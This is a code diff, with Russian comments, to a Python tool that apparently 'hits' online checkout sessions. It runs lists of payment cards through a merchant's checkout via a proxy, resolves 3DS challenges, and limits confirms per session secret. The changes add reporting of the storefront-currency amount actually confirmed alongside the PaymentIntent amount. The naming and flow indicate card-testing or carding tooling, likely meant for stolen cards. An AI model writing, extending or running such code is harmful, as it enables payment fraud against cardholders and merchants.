@@ -450,6 +450,11 @@ class CsHitSession:
         verdict, detail = await self._classify_and_resolve_3ds(resp, profile, confirm_body=body)
         return {"status": verdict, "detail": detail[:250],
                 "amount_cents": self.amount, "currency": self.currency,
+                # Сколько реально уходило в confirm: у подписок это валюта ВИТРИНЫ, а не валюта PI
+                # (живой замер 2026-09-13: PI 1900 USD против инвойса 2504 SGD). Отчёт обязан
+                # показывать оба, иначе «подтверждено 2504 SGD» выглядит как «PI 1900 USD».
+                "confirmed_amount_cents": getattr(self, "expected_amount", 0) or self.amount,
+                "confirmed_currency": self.currency,
                 "steering_category": profile.category.value,
                 "confidence": profile.confidence_score,
                 "reason": profile.reason}
@@ -954,6 +959,9 @@ async def execute_hit(target_url: str, cards: list, proxy: str | None = None,
         "pi_id": gs.pi_id,
         "amount_cents": gs.amount,
         "currency": gs.currency,
+        # Подтверждаем и считаем сумму в валюте витрины: у подписок она отличается от валюты PI.
+        "confirmed_amount_cents": getattr(gs, "expected_amount", 0) or gs.amount,
+        "confirmed_currency": gs.currency,
         "terminal_hit": terminal_hit,
         "results": results,
     }
@@ -1053,7 +1061,8 @@ async def main():
     if not ok:
         print(f"[x] open failed: {detail}")
         return
-    print(f"[+] session: {gs.pi_id} {gs.amount}{gs.currency} (confirms: {gs.confirms}/{config.MAX_CONFIRMS_PER_SECRET})")
+    print(f"[+] session: {gs.pi_id} | PI {gs.amount}{gs.currency} | подтверждаем "
+          f"{gs.expected_amount or gs.amount}{gs.currency} (confirms: {gs.confirms}/{config.MAX_CONFIRMS_PER_SECRET})")
     try:
         for i, c in enumerate(cards):
             t0 = time.perf_counter()
@@ -1061,7 +1070,9 @@ async def main():
             lat = int((time.perf_counter() - t0) * 1000)
             st = str(res.get("status", "?"))
             steer_tag = f"[{res.get('steering_category', '?')[:6]}]"
-            print(f">>> [{st:18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:100]}", flush=True)
+            conf = f"{res.get('confirmed_amount_cents')}{res.get('confirmed_currency')}"
+            print(f">>> [{st:18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) подтверждено {conf} -> "
+                  f"{res.get('detail', '')[:100]}", flush=True)
             _log.log_verdict("hit", gc.mask_pan(c), st,
                              detail=str(res.get("detail", ""))[:60], latency_ms=lat)
             if st in ("SESSION_EXPIRED", "SESSION_CANCELED"):
